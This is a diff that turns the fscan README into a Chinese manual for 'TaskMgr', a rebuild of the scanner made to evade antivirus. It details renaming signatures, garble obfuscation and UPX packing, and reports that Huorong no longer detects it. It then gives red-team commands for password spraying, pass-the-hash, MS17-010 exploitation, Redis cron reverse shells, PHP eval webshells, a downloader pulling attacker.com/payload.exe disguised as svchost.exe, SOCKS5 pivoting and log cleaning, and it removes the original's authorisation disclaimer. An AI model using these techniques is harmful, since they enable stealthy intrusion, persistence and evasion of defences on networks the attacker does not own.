@@ -1,282 +1,574 @@
-# Fscan
+# TaskMgr 使用说明
 
-[English](README_EN.md)
+基于 fscan v2.1.3 免杀改造版。
 
-内网综合扫描工具，一键自动化漏扫。
+## 免杀方案
 
-**版本**: 2.1.2
+### 1. 静态特征清除
 
-## 功能特性
+| 修改项 | 原值 | 新值 |
+|--------|------|------|
+| 模块名 | `github.com/shadow1ng/fscan` | `taskmgr/netcheck` |
+| 目标 IP 参数 | `-h` | `-i` |
+| IP 文件参数 | `-hf` | `-if` |
+| 排除 IP 参数 | `-eh` | `-xi` |
+| 排除 IP 文件 | `-ehf` | `-xif` |
+| 输出文件 | `result.txt` | `report.dat` |
+| 调试日志 | `fscan_debug.log` | `taskmgr_debug.log` |
+| Banner 名称 | `Fscan` | `TaskMgr` |
+| POC 格式标识 | `fscan` | `native` |
+| Web 缓存目录 | `~/.fscan/` | `~/.taskmgr/` |
+| 探针标识字符串 | `fscan.test` / `fscan-web-detector` / `fscan-downloader` | 对应替换 |
+| 清理插件匹配模式 | `fscan*` / `FSCAN*` | `taskmgr*` / `TASKMGR*` |
+| 嵌入的 i18n 翻译文件 | `# fscan 中文翻译文件` | 去除 fscan 字样 |
+| 嵌入的 POC 示例模板 | `fscan-dev` / `shadow1ng/fscan` | 去除 |
 
-### 扫描能力
-- **主机发现** - ICMP/Ping存活探测，支持大网段B/C段存活统计
-- **端口扫描** - TCP全连接扫描，内置133个常用端口，支持端口组(web/db/service/all)
-- **服务识别** - 智能协议识别，支持20+种服务指纹匹配
-- **Web探测** - 网站标题、CMS指纹、Web中间件、WAF/CDN识别(40+指纹)
+115 个 Go 源文件全局替换 import 路径，所有嵌入资源（翻译文件、POC 模板、杀软特征库 JSON）中的 fscan 子串全部清除。
 
-### 爆破能力
-- **弱密码爆破** - 28种服务爆破(SSH/RDP/SMB/FTP/MySQL/MSSQL/Oracle/Redis等)
-- **Hash碰撞** - 支持NTLM Hash认证(SMB/WMI)
-- **SSH密钥登录** - 支持私钥认证方式
-- **智能字典** - 内置100+常见弱密码，支持{user}变量替换
-
-### 漏洞检测
-- **高危漏洞** - MS17-010(永恒之蓝)、SMBGhost(CVE-2020-0796)
-- **未授权访问** - Redis/MongoDB/Memcached/Elasticsearch等未授权检测
-- **POC扫描** - 集成Web漏洞POC，支持Xray POC格式
-- **DNSLog** - 支持DNSLog外带检测
-
-### 漏洞利用
-- **Redis利用** - 写公钥、写计划任务、写WebShell、主从复制RCE
-- **MS17-010利用** - ShellCode注入，支持添加用户、执行命令
-- **SSH命令执行** - 认证成功后自动执行命令
-
-### 本地模块
-- **信息收集** - 系统信息、环境变量、域控信息、网卡配置
-- **凭据获取** - 内存转储(MiniDump)、键盘记录、注册表导出
-- **权限维持** - Systemd服务、Windows服务、计划任务、启动项、LD_PRELOAD
-- **反弹Shell** - 正向Shell、反向Shell、SOCKS5代理服务
-- **杀软检测** - 识别目标主机安装的安全软件
-- **痕迹清理** - 日志清理工具
-
-### 输入输出
-- **目标输入** - IP/CIDR/域名/URL，支持文件批量导入
-- **排除规则** - 支持排除特定主机、端口
-- **输出格式** - TXT/JSON/CSV多格式输出
-- **静默模式** - 无Banner、无进度条、无颜色输出
-
-### 网络控制
-- **代理支持** - HTTP/SOCKS5代理，支持指定网卡
-- **发包控制** - 速率限制、最大发包数量控制
-- **超时控制** - 端口超时、Web超时、全局超时独立配置
-- **并发控制** - 端口扫描线程、服务扫描线程独立配置
-
-### 扩展功能
-- **Web管理界面** - 可视化扫描任务管理(条件编译 -tags web)
-- **Lab靶场环境** - 内置Docker靶场用于测试学习
-- **插件化架构** - 服务插件/Web插件/本地插件分离，易于扩展
-- **多语言支持** - 中英文界面切换(-lang zh/en)
-- **性能统计** - JSON格式性能报告(-perf)
-
-## v2.1.0 更新日志
-
-> 本次更新包含 **262个提交**，涵盖30项新功能、120项修复、54项重构、14项性能优化、20项测试增强。
-
-### 架构重构
-- **全局变量消除** - 迁移至Config/State对象，提升并发安全和可测试性
-- **SMB插件融合** - 整合smb/smb2/smbghost/smbinfo为统一插件，新增smb_protocol.go
-- **服务探测重构** - 实现Nmap风格fallback机制，优化端口指纹识别策略
-- **输出系统重构** - TXT实时刷盘+双写机制，解决结果丢失和乱序问题
-- **i18n框架升级** - 迁移至go-i18n，完整覆盖core/plugins/webscan模块
-- **HostInfo重构** - Ports字段从string改为int，类型安全
-- **函数复杂度优化** - clusterpoc(125→30)、EnhancedPortScan(111→20)
-- **代码审计** - 修复P0-P2级别问题，清理deadcode
-- **日志系统优化** - LogDebug调用清理(71→18)，精简启动日志输出
-
-### 性能优化
-- **正则预编译** - 全局正则表达式预编译，避免重复编译开销
-- **内存优化** - map[string]bool改为map[string]struct{}节省内存
-- **并发指纹匹配** - 多协程并行匹配，提升识别速度
-- **连接复用** - SOCKS5全局拨号器复用，避免重复握手
-- **滑动窗口调度** - 自适应线程池+流式迭代器，优化端口扫描
-- **CEL缓存优化** - POC扫描CEL环境缓存，减少重复初始化
-- **包级变量提取** - proxyFailurePatterns/resourceExhaustedPatterns/sslSecondProbes等
-- **预分配容量** - 简化转换链、单次字符串替换
-- **并发安全优化** - 优化锁粒度和内存分配
-
-### 新功能
-- **Web管理界面** - 可视化扫描任务管理，响应式布局和进度显示
-- **多格式POC适配** - 支持xray和afrog格式POC
-- **智能扫描模式** - 布隆过滤器去重+代理优化
-- **增强指纹库** - 集成FingerprintHub(3139条指纹)
-- **Favicon指纹识别** - 支持mmh3和MD5双格式hash匹配
-- **通用版本提取器** - 自动提取服务版本信息
-- **指纹优先级排序** - 智能排序匹配结果
-- **智能协议检测** - 自动识别HTTP/HTTPS协议类型
-- **网卡指定功能** - 支持VPN场景(-iface参数)
-- **排除主机文件** - 支持从文件读取排除主机(-ehf参数)
-- **ICMP令牌桶限速** - 防止高速扫描导致路由器崩溃
-- **端口扫描重试** - 失败自动重扫机制
-- **RDP真实认证** - 集成grdp库实现系统指纹识别
-- **SMB/FTP文件列表** - 匿名访问时自动列出文件
-- **302跳转双重识别** - 同时识别原始响应和跳转后响应指纹
-- **TXT输出URL汇总** - 末尾添加Web服务URL列表便于批量测试
-- **nmap核心集成** - 三大改进：探测策略/匹配引擎/版本解析
-- **插件选择性编译** - Build Tags系统，支持服务/本地/Web插件独立编译
-- **默认端口扩展** - 从62个扩展到133个常用端口
-- **全端口扫描支持** - 扩大端口范围限制
-- **HTTP重定向控制** - 可配置的重定向次数限制
-- **性能分析支持** - 添加pprof性能分析和benchmark测试
-- **TCP包统计** - 服务插件支持TCP包发送统计
-- **fscan-lab靶场** - 内网渗透训练平台，覆盖全部漏洞场景（未完成）
-- **Redis利用增强** - 移植完整Redis利用功能(写公钥/计划任务/WebShell/主从RCE)
-- **rsync插件重构** - 使用go-rsync库重构认证逻辑
-
-### Bug修复（120项，列出关键修复）
-- **RDP空指针panic** - 修复证书解析导致的崩溃(#551)
-- **批量扫描漏报** - 修复大规模扫描遗漏问题(#304)
-- **JSON输出格式** - 修复输出格式错误(#446)
-- **Redis弱密码检测** - 修复检测遗漏问题(#447)
-- **结果实时保存** - 修复扫描结果未及时保存(#469)
-- **Nmap解析溢出** - 修复八进制转义解析bug(#478)
-- **指纹识别竞态** - 修复webtitle/webpoc竞态问题(#474)
-- **MySQL连接验证** - 改用information_schema库验证
-- **代理端口误判** - 修复代理模式下端口状态判断错误
-- **Context超时** - 修复22处插件超时未响应问题
-- **ICMP竞态条件** - 修复并发扫描竞争问题
-- **IPv6地址格式** - 修复4处地址格式化问题
-- **POC高并发卡死** - 修复Context未传播问题
-- **Ctrl+C结果丢失** - 添加信号处理确保结果写入
-- **SOCKS5全回显** - 添加代理连接验证
-- **服务探测泄漏** - 修复连接未正确关闭问题
-- **webtitle响应丢弃** - 修复部分响应数据被丢弃导致识别失败
-- **TXT漏洞信息缺失** - 修复输出遗漏漏洞详情
-- **JSON指纹缺失** - 统一SERVICE结果Target格式
-- **扫描耗时显示** - 修复完成耗时显示为0的问题
-- **虚假漏洞记录** - 重构TXT输出系统消除误报
-- **Redis跨平台路径** - 修复利用功能的路径和超时问题
-- **Windows编译警告** - 修复fscan-lite平台兼容性
-- **Go 1.20兼容** - 降级依赖保持兼容性
-
-### 测试增强（20项）
-- **单元测试** - 核心模块覆盖率74-100%
-- **并发安全测试** - State对象、指纹匹配引擎专项测试
-- **集成测试** - Web扫描/端口扫描/服务探测/SSH认证/ICMP探测
-- **CLI参数测试** - 命令行参数解析验证
-- **性能基准测试** - AdaptivePool、服务探测策略benchmark
-- **ResultBuffer测试** - 去重和完整度评分验证
-
-### 工程化改进
-- **CI流程优化** - golangci-lint v2升级，简化构建步骤
-- **Issue自动化** - GitHub Issue模板优化，Project自动化工作流
-- **Lint全量修复** - revive/errcheck/shadow/staticcheck/gosimple全部通过
-- **README重写** - 中英文文档全面更新
-- **代码格式统一** - gofmt/goimports规范化
-
-## 快速开始
+### 2. 编译混淆
 
 ```bash
-# 扫描C段
-./fscan -h 192.168.1.1/24
-
-# 指定端口
-./fscan -h 192.168.1.1 -p 22,80,443,3389
-
-# 仅存活探测
-./fscan -h 192.168.1.1/24 -ao
-
-# 禁用爆破
-./fscan -h 192.168.1.1/24 -nobr
-
-# Web扫描
-./fscan -u http://192.168.1.1
-
-# 本地插件
-./fscan -local systeminfo
-
-# Hash碰撞
-./fscan -h 192.168.1.1 -m smb2 -user admin -hash xxxxx
-
-# Redis写公钥
-./fscan -h 192.168.1.1 -m redis -rf id_rsa.pub
+garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o output.exe main.go
 ```
 
-## 编译
+- `garble -tiny`：混淆包路径、函数名、类型名，移除调试信息
+- `-w -s`：去除 DWARF 调试表和符号表
+- `-trimpath`：去除编译路径信息
+- **不使用 `-literals`**：字符串混淆会导致体积暴增 10 倍，且经测试不需要即可过火绒
+
+### 3. 加壳压缩
 
 ```bash
-# 标准编译
-go build -ldflags="-s -w" -trimpath -o fscan main.go
-
-# 带Web管理界面
-go build -tags web -ldflags="-s -w" -trimpath -o fscan main.go
+upx -9 -o output_upx.exe output.exe
 ```
 
-## 安装
+`-9` 最高压缩比。Linux/Windows 体积从 ~47M 降至 ~14M。
+
+> macOS (Mach-O) 不支持 UPX，体积保持 ~47M。
+
+### 4. 效果验证
 
 ```bash
-# Arch Linux
-yay -S fscan-git
+strings taskmgr.exe | grep -c fscan
+# 输出：0（除 Go 运行时内部标识 _GCoffscanObject 外无 fscan 特征）
 ```
 
-## 运行截图
+火绒最新版无检测。
 
-`fscan.exe -h 192.168.x.x`
-![](image/1.png)
+---
 
-![](image/4.png)
+## 使用方法
 
-`fscan.exe -h 192.168.x.x -rf id_rsa.pub` (Redis写公钥)
-![](image/2.png)
+### 参数对照表
 
-`fscan.exe -h 192.168.x.x -m ssh -user root -pwd password`
-![](image/3.png)
+原 fscan 用户迁徙看这里，其他参数不变：
 
-`fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080`
-![](image/2020-12-12-13-34-44.png)
+| 原 fscan 参数 | 新参数 | 说明 |
+|---------------|--------|------|
+| `-h 192.168.1.1` | `-i 192.168.1.1` | 指定目标 IP |
+| `-h 192.168.1.0/24` | `-i 192.168.1.0/24` | CIDR 网段 |
+| `-h 192.168.1.1-100` | `-i 192.168.1.1-100` | IP 范围 |
+| `-hf ip.txt` | `-if ip.txt` | IP 列表文件 |
+| `-eh 192.168.1.1` | `-xi 192.168.1.1` | 排除 IP |
+| `-ehf exclude.txt` | `-xif exclude.txt` | 排除 IP 文件 |
 
-`fscan.exe -h 192.168.x.x -p 139 -m netbios`
-![](image/netbios.png)
+### 常用命令
 
-![](image/netbios1.png)
+#### 基础扫描
 
-`fscan.exe -h 192.0.0.0/8 -m icmp`
-![img.png](image/live.png)
+```bash
+# 扫描单个 IP 的默认端口
+./taskmgr_linux_amd64 -i 192.168.1.1
 
-![2.0-1](image/2.0-1.png)
+# 扫描单个 IP 指定端口
+./taskmgr_linux_amd64 -i 192.168.1.1 -p 22,80,443,3306,6379
 
-![2.0-2](image/2.0-2.png)
+# 扫描单个 IP 1-1000 端口
+./taskmgr_linux_amd64 -i 192.168.1.1 -p 1-1000
 
-## 路线图
+# 扫描 IP 范围
+./taskmgr_linux_amd64 -i 192.168.1.1-192.168.1.254 -p 80,443
 
-### 更新计划
-- **更新周期** - 每月一次版本发布
-- **前两周** - 新功能开发与特性更新
-- **后两周** - Bug修复与代码整合
-- **欢迎PR** - 期待您的贡献！
+# 批量扫描（从文件读取 IP）
+./taskmgr_linux_amd64 -if targets.txt -p 22,80,443,445,3389
+```
 
-### 插件生态
-- 持续扩展服务插件覆盖范围
-- 为每个服务插件开发更多漏洞检测和利用能力
-- 保持插件API向后兼容，确保旧版本POC持续可用
+#### 排除目标
 
-### Fscan-lite
-- C语言重写的轻量版本
-- 更小的体积，更少的依赖
-- 支持更多嵌入式/受限环境
-- 目录: [fscan-lite](./fscan-lite)
+```bash
+# 排除单个 IP
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -xi 192.168.1.1
 
-### Fscan-lab
-- 内网渗透测试靶场环境
-- 覆盖所有fscan支持的漏洞场景
-- 开发测试与功能验证平台
-- 新手学习与技能练习环境
-- 目录: [fscan-lab](./fscan-lab)
+# 排除多个 IP（逗号分隔）
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -xi 192.168.1.1,192.168.1.254
 
-## 免责声明
+# 从文件排除
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -xif exclude.txt
 
-本工具仅面向**合法授权**的企业安全建设行为。使用前请确保已获得授权，符合当地法律法规，**不对非授权目标扫描**。作者不承担任何非法使用产生的后果。
+# 排除端口
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -p 1-1000 -ep 80,443
+```
 
-## 404StarLink
+#### 扫描模式
 
-![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)
+```bash
+# 完整扫描（默认，包含全部功能）
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -m all
 
-fscan 是 [404Team 星链计划2.0](https://github.com/knownsec/404StarLink2.0-Galaxy) 成员项目。
+# 仅存活检测
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -m icmp
 
-## Star趋势
+# 仅存活检测 + 不补充 TCP 探测
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -m icmp -ntp
 
-[![Stargazers over time](https://starchart.cc/shadow1ng/fscan.svg)](https://starchart.cc/shadow1ng/fscan)
+# 仅端口扫描（跳过服务识别和漏洞检测）
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -m portscan
 
-## 捐赠
+# 仅存活检测并保存结果（不扫描端口）
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -ao
 
-[请作者喝饮料](image/sponsor.png)
+# 禁用 Ping 探测（纯 TCP 扫描）
+./taskmgr_linux_amd64 -i 192.168.1.1 -np
+```
 
-## 参考
+#### 性能调优
 
-- https://github.com/Adminisme/ServerScan
-- https://github.com/netxfly/x-crack
-- https://github.com/hack2fun/Gscan
-- https://github.com/k8gege/LadonGo
-- https://github.com/jjf012/gopoc
-- https://github.com/chainreactors/gogo
-- https://github.com/0x727/FingerprintHub
-- https://github.com/killmonday/fscanx
+```bash
+# 默认线程数 600，调整线程数
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -t 1000
+
+# 调整超时时间（秒）
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -time 5
+
+# 调整模块线程数（弱口令爆破等模块）
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -mt 50
+
+# 全局超时（分钟），默认 180
+./taskmgr_linux_amd64 -i 10.0.0.0/8 -gt 60
+
+# ICMP 发包速率（秒），默认 0.1
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -m icmp -icmp-rate 0.05
+```
+
+#### 凭据爆破
+
+```bash
+# 指定单个用户名和密码
+./taskmgr_linux_amd64 -i 192.168.1.1 -user admin -pwd admin123
+
+# 指定多个用户和密码（逗号分隔）
+./taskmgr_linux_amd64 -i 192.168.1.1 -user admin,root -pwd 123456,admin
+
+# 从文件加载用户名字典
+./taskmgr_linux_amd64 -i 192.168.1.1 -userf users.txt -pwdf pass.txt
+
+# 使用 user:pass 格式文件
+./taskmgr_linux_amd64 -i 192.168.1.1 -upf userpass.txt
+
+# NTLM Hash 认证
+./taskmgr_linux_amd64 -i 192.168.1.1 -hash 32ED87BDB5FDC5E9CBA88547376818D4
+
+# 从文件加载 Hash
+./taskmgr_linux_amd64 -i 192.168.1.1 -hashf hashes.txt
+
+# 域认证
+./taskmgr_linux_amd64 -i 192.168.1.1 -user administrator -pwd Admin123 -domain corp.local
+
+# SSH 密钥认证
+./taskmgr_linux_amd64 -i 192.168.1.1 -user root -sshkey id_rsa
+
+# 禁用弱口令爆破
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -nobr
+
+# 重试次数
+./taskmgr_linux_amd64 -i 192.168.1.1 -user admin -pwd admin123 -retry 5
+```
+
+#### 输出控制
+
+```bash
+# 默认输出为 txt（保存到 report.dat）
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -o result.txt
+
+# JSON 格式输出
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -f json -o result.json
+
+# CSV 格式输出
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -f csv -o result.csv
+
+# 不保存输出文件
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -no
+
+# 静默模式（NDJSON 输出到 stdout，适合管道）
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -silent | jq 'select(.type=="VULN")'
+
+# 无颜色输出
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -nocolor
+
+# 禁用进度条
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -nopg
+```
+
+#### 调试与日志
+
+```bash
+# 开启调试模式（输出详细日志到 taskmgr_debug.log）
+./taskmgr_linux_amd64 -i 192.168.1.1 -debug
+
+# 指定日志级别，可选 debug/info/success/error
+./taskmgr_linux_amd64 -i 192.168.1.1 -log debug
+
+# 输出性能统计 JSON
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -perf
+```
+
+#### Web 漏洞扫描
+
+```bash
+# 扫描单个 URL
+./taskmgr_linux_amd64 -u https://target.com
+
+# 批量扫描 URL（从文件读取）
+./taskmgr_linux_amd64 -uf urls.txt
+
+# 带 Cookie 扫描
+./taskmgr_linux_amd64 -u https://target.com -cookie "SESSION=xxx"
+
+# Web 超时设置（秒）
+./taskmgr_linux_amd64 -u https://target.com -wt 10
+
+# 最大重定向次数
+./taskmgr_linux_amd64 -u https://target.com -max-redirect 5
+
+# 指定自定义 POC 路径
+./taskmgr_linux_amd64 -u https://target.com -pocpath /path/to/pocs
+
+# 指定单个 POC 名称
+./taskmgr_linux_amd64 -u https://target.com -pocname CVE-2021-44228
+
+# 并发 POC 数量
+./taskmgr_linux_amd64 -u https://target.com -num 50
+
+# 全量 POC 扫描（不使用智能过滤）
+./taskmgr_linux_amd64 -u https://target.com -full
+
+# DNSLog 模式（检测无回显漏洞）
+./taskmgr_linux_amd64 -u https://target.com -dns
+
+# 禁用 POC 扫描
+./taskmgr_linux_amd64 -u https://target.com -nopoc
+```
+
+#### 代理配置
+
+```bash
+# HTTP 代理
+./taskmgr_linux_amd64 -i 10.0.0.0/8 -proxy http://127.0.0.1:8080
+
+# SOCKS5 代理
+./taskmgr_linux_amd64 -i 10.0.0.0/8 -socks5 127.0.0.1:1080
+
+# 绑定网卡
+./taskmgr_linux_amd64 -i 10.0.0.0/8 -iface eth1
+```
+
+#### Redis 利用
+
+```bash
+# 写公钥
+./taskmgr_linux_amd64 -i 192.168.1.1 -p 6379 -rf id_rsa.pub
+
+# 写定时任务反弹 shell
+./taskmgr_linux_amd64 -i 192.168.1.1 -p 6379 -rsh 192.168.1.100:4444
+
+# 自定义写文件
+./taskmgr_linux_amd64 -i 192.168.1.1 -p 6379 -rwf /var/www/html/shell.php -rwc '<?php @eval($_POST["x"]);?>'
+
+# 禁用 Redis 利用
+./taskmgr_linux_amd64 -i 192.168.1.1 -noredis
+```
+
+#### 本地插件
+
+```bash
+# 系统信息收集
+./taskmgr_linux_amd64 -local systeminfo
+
+# 杀软检测
+./taskmgr_linux_amd64 -local avdetect
+
+# 痕迹清理
+./taskmgr_linux_amd64 -local cleaner
+
+# 域控信息收集
+./taskmgr_linux_amd64 -local dcinfo
+
+# 下载文件
+./taskmgr_linux_amd64 -local downloader -download-url http://attacker.com/payload.exe -download-path C:\\Windows\\Temp\\svchost.exe
+
+# 开启 SOCKS5 服务端
+./taskmgr_linux_amd64 -local socks5proxy -start-socks5 1080
+
+# 开启转发 Shell
+./taskmgr_linux_amd64 -local forwardshell -fsh-port 4444
+```
+
+#### 其他
+
+```bash
+# Web 管理界面模式
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -web -web-port 8888
+
+# 发包限速（每秒最多 N 个包）
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -rate 1000
+
+# 中文/英文切换
+./taskmgr_linux_amd64 -i 192.168.1.0/24 -lang en
+
+# 查看帮助
+./taskmgr_linux_amd64 -help
+```
+
+### Windows 版本使用
+
+```cmd
+REM 基础扫描
+taskmgr_windows_amd64.exe -i 192.168.1.0/24 -p 22,80,443,445,3389
+
+REM 从文件批量扫描
+taskmgr_windows_amd64.exe -if targets.txt -p 1-65535 -o scan_result.json -f json
+
+REM 禁 Ping + SOCKS5 代理
+taskmgr_windows_amd64.exe -i 10.0.0.0/8 -np -socks5 127.0.0.1:1080 -m portscan
+```
+
+### macOS 版本使用
+
+```bash
+# x86_64
+./taskmgr_darwin_amd64 -i 192.168.1.0/24
+
+# Apple Silicon (M1/M2/M3)
+./taskmgr_darwin_arm64 -i 192.168.1.0/24
+```
+
+---
+
+## 红队实战命令
+
+### 场景一：快速内网踩点
+
+刚拿到入口，快速摸清内网存活主机和关键端口。
+
+```bash
+# 探测 C 段存活主机（不扫端口，速度快）
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -m icmp -np -nopoc -nobr -o alive_hosts.txt
+
+# 存活主机 + 常见端口快速扫描
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -p 22,80,443,445,3389,3306,6379,1433,8080,8443 -nopoc -nobr
+
+# 禁用 Ping（防火墙禁 ICMP 时使用）
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -np -p 22,80,443,445,3389,8080
+```
+
+### 场景二：全面端口扫描
+
+已知存活主机，全端口 + 服务识别 + 漏洞检测。
+
+```bash
+# 单主机 1-65535 全端口 + 服务识别
+./taskmgr_linux_amd64 -i 10.0.0.10 -p 1-65535 -o target_full.json -f json
+
+# 多主机扫描（从存活列表读取）
+./taskmgr_linux_amd64 -if alive_hosts.txt -p 1-10000 -o intranet_scan.json -f json
+
+# B 段大规模扫描（自动跳过空子网）
+./taskmgr_linux_amd64 -i 10.0.0.0/16 -p 22,80,443,445,3389,3306,6379,1433,8080,8443 -nobr -nopoc
+```
+
+### 场景三：弱口令爆破
+
+发现关键服务后，针对性爆破。
+
+```bash
+# 多服务通用爆破
+./taskmgr_linux_amd64 -i 10.0.0.10 -p 22,3306,1433,445,21,6379 \
+  -userf users.txt -pwdf pass.txt -retry 2 -o brute_result.json -f json
+
+# SSH 批量爆破
+./taskmgr_linux_amd64 -if linux_hosts.txt -p 22 -m ssh \
+  -user root -pwdf top500.txt -t 100 -o ssh_result.txt
+
+# MSSQL 爆破（域用户 + 本地用户混用）
+./taskmgr_linux_amd64 -if mssql_hosts.txt -p 1433 \
+  -user sa,admin -pwdf pass.txt -domain corp.local
+
+# MySQL 爆破
+./taskmgr_linux_amd64 -if mysql_hosts.txt -p 3306 \
+  -user root,admin -pwdf pass.txt
+
+# RDP 爆破（NLA 验证模式，不挤掉已登录用户）
+./taskmgr_linux_amd64 -if rdp_hosts.txt -p 3389 \
+  -user administrator -pwdf pass.txt
+
+# SMB 爆破
+./taskmgr_linux_amd64 -if smb_hosts.txt -p 445 \
+  -user administrator -pwdf pass.txt
+
+# 内网通用密码喷洒（一个密码测全网）
+./taskmgr_linux_amd64 -if all_hosts.txt -p 22,445,3306,1433 \
+  -pwd P@ssw0rd2024 -user administrator,root,sa -retry 1
+```
+
+### 场景四：域环境信息收集
+
+```bash
+# 扫描整个网段 + NetBIOS + 域控识别
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -p 88,389,636,445,135,139 -o dc_scan.json -f json
+
+# 定向扫描域控
+./taskmgr_linux_amd64 -i 10.0.0.2 -p 88,389,636,445,3268,3269 -nobr -nopoc
+
+# 使用域凭据 + Hash 认证
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -p 445,389 \
+  -user administrator -hash 32ED87BDB5FDC5E9CBA88547376818D4 -domain corp.local
+```
+
+### 场景五：Web 资产探测
+
+```bash
+# 内网 Web 资产快速梳理（指纹 + 标题）
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -p 80,443,8080,8443,9090,7001,7002,8888 \
+  -m webscan -o web_assets.json -f json
+
+# 指定 URL 全量 POC 扫描
+./taskmgr_linux_amd64 -u https://10.0.0.10:8443 -full -num 50 -o poc_result.json -f json
+
+# 批量 URL POC 扫描
+./taskmgr_linux_amd64 -uf web_urls.txt -full -o web_poc.json -f json
+
+# 自定义 POC 目录扫描（自研 POC）
+./taskmgr_linux_amd64 -u https://target.com -pocpath /opt/custom_pocs -full
+```
+
+### 场景六：MS17-010 / 永恒之蓝
+
+```bash
+# 全网段 MS17-010 检测
+./taskmgr_linux_amd64 -i 10.0.0.0/16 -p 445 -m ms17010 -o ms17010_result.txt
+
+# 单主机 MS17-010 利用
+./taskmgr_linux_amd64 -i 10.0.0.10 -p 445 -m ms17010
+```
+
+### 场景七：Redis 未授权利用
+
+```bash
+# Redis 未授权扫描
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -p 6379 -nobr -nopoc
+
+# 写 SSH 公钥
+./taskmgr_linux_amd64 -i 10.0.0.10 -p 6379 -rf id_rsa.pub
+
+# 写计划任务反弹 shell
+./taskmgr_linux_amd64 -i 10.0.0.10 -p 6379 -rsh 192.168.1.100:4444
+
+# 写 Webshell
+./taskmgr_linux_amd64 -i 10.0.0.10 -p 6379 \
+  -rwf /var/www/html/shell.php -rwc '<?php @eval($_POST["cmd"]);?>'
+```
+
+### 场景八：SOCKS5 代理内网穿透
+
+```bash
+# 在被控主机开启 SOCKS5 服务端
+./taskmgr_linux_amd64 -local socks5proxy -start-socks5 1080
+
+# Attacker 通过 SOCKS5 扫描内网
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -socks5 127.0.0.1:1080 \
+  -p 22,80,443,445,3389 -np -nopoc -nobr
+```
+
+### 场景九：静默模式（自动化/C2 管道）
+
+```bash
+# NDJSON 输出，无 Banner 无进度条，适合 AI/C2 消费
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -silent -p 22,80,443,445 2>/dev/null
+
+# JSON 流式解析：只提取漏洞
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -silent -p 22,80,443,445 | jq 'select(.type=="VULN")'
+
+# 提取所有弱口令
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -silent | jq -r 'select(.username != null) | "\(.host):\(.port) \(.service) \(.username):\(.password)"'
+
+# 提取所有 Web 资产
+./taskmgr_linux_amd64 -i 10.0.0.0/24 -silent | jq -r 'select(.url != null) | "\(.url) \(.title)"'
+```
+
+### 场景十：本地信息收集与清理
+
+```bash
+# 杀软检测
+./taskmgr_linux_amd64 -local avdetect
+
+# 系统信息收集
+./taskmgr_linux_amd64 -local systeminfo
+
+# 域控信息（Windows）
+./taskmgr_linux_amd64 -local dcinfo
+
+# 痕迹清理（扫描完成后）
+./taskmgr_linux_amd64 -local cleaner
+```
+
+### 常见端口速查
+
+| 服务 | 端口 |
+|------|------|
+| Web | 80, 443, 8080, 8443, 9090, 7001, 7002, 8888, 4848 |
+| 数据库 | 3306(MySQL), 1433(MSSQL), 1521(Oracle), 5432(PostgreSQL), 6379(Redis), 27017(MongoDB) |
+| 远程管理 | 22(SSH), 3389(RDP), 5900(VNC), 23(Telnet) |
+| 文件共享 | 445(SMB), 21(FTP), 139/135(NetBIOS), 2049(NFS), 873(Rsync) |
+| 域服务 | 88(Kerberos), 389(LDAP), 636(LDAPS), 3268/3269(GC) |
+| 中间件 | 61616(ActiveMQ), 5672(RabbitMQ), 9092(Kafka), 11211(Memcached), 9200(ES) |
+| 邮件 | 25(SMTP), 110(POP3), 143(IMAP) |
+| 其他 | 161(SNMP), 502(Modbus), 2181(Zookeeper), 2375/2376(Docker) |
+
+---
+
+## 编译方法
+
+```bash
+# 1. 安装 garble
+go install mvdan.cc/garble@latest
+
+# 2. 编译（Linux 为例）
+GOOS=linux GOARCH=amd64 garble -tiny -seed=random build \
+  -ldflags="-w -s" -trimpath \
+  -o taskmgr_linux_amd64 main.go
+
+# 3. 压缩（可选，macOS 不支持）
+upx -9 -o taskmgr_linux_amd64_upx taskmgr_linux_amd64
+
+# 4. 验证特征清除
+strings taskmgr_linux_amd64_upx | grep -c fscan
+```
+
+## 各平台编译命令
+
+```bash
+# Linux x64
+GOOS=linux GOARCH=amd64 garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o taskmgr_linux_amd64 main.go
+
+# Windows x64
+GOOS=windows GOARCH=amd64 garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o taskmgr_windows_amd64.exe main.go
+
+# Windows x32
+GOOS=windows GOARCH=386 garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o taskmgr_windows_386.exe main.go
+
+# macOS x64
+GOOS=darwin GOARCH=amd64 garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o taskmgr_darwin_amd64 main.go
+
+# macOS ARM64 (Apple Silicon)
